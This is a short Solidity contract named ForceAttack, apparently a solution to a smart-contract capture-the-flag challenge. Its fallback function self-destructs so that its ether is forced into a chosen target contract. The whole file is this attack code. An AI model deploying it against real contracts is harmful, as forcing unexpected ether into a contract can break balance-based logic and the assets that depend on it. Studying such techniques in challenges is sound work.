// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address payable target;

    constructor(address _target) {
        target = payable(_target);
    }

    fallback() external payable {
        selfdestruct(target);
    }
}
